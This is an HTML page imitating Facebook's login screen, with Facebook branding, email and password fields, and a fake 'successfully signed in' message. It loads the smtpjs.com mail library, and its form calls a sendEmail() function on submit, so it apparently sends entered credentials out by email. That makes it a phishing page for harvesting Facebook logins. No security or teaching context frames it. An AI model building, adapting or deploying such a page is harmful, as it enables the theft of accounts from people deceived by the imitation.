<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="./Assets/favicon.png" type="image/x-icon">
    <title>Facebook - log in or sign up</title>
</head>
<body>
    <div class="success" id="success">
        <div class="success-content">
        <h2>You have successfully signed in</h2>
        <a href="../Portfolio/index.html" class="btn">Next</a>
        </div>
    </div>
    <div class="danger" id="danger">
        <div class="danger-content">
        <h2>Incorrect Password</h2>
        </div>
    </div>
    <div class="left-flex-dp first-main-container">
            <img src="./Assets/facebook logo.svg">
            <img src="./Assets/favicon.png" class="logo">
        <h2>Facebook helps you connect and share with the people in your life.</h2>
    </div>
    <div class="right-flex-dp second-main-container">
        <form class="form-container" onsubmit="sendEmail(); return false;">
            <input type="email, number" class="email-input" id="userEmail" placeholder="Email address or phone number" required>
            <div class="input-box">
            <input type="password" class="password-input" id="userPassword" placeholder="Password" required>
            <img src="./Assets/eye close.png" id="eyeicon">
            </div>
            <button type="submit" onclick="message()">Log in</button>
            <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgxMzE4MDg3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login" class="for-esh-1">Forgotten password?</a>
            <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgxMzE4MDg3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login" class="for-esh-2">Forgot password?</a>
            <div class="line"></div>
            <a type="button" class="button" href="https://www.facebook.com/campaign/landing.php?campaign_id=1653377901&extra_1=s%7Cc%7C358050429326%7Ce%7Cfacebook%20create%20account%7C&placement=&creative=358050429326&keyword=facebook%20create%20account&partner_id=googlesem&extra_2=campaignid%3D1653377901%26adgroupid%3D65139788602%26matchtype%3De%26network%3Dg%26source%3Dnotmobile%26search_or_content%3Ds%26device%3Dc%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-309327057760%26loc_physical_ms%3D1011081%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gclid=CjwKCAjwrdmhBhBBEiwA4Hx5g0xHkcq193tO_E3VoDJd8C4MzydigZzrE56elmmbJaQiR2T0ztlM-xoCJjYQAvD_BwE">Create new account</a>
        </form>
    </div>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script src="./app.js"></script>
</body>
</html>
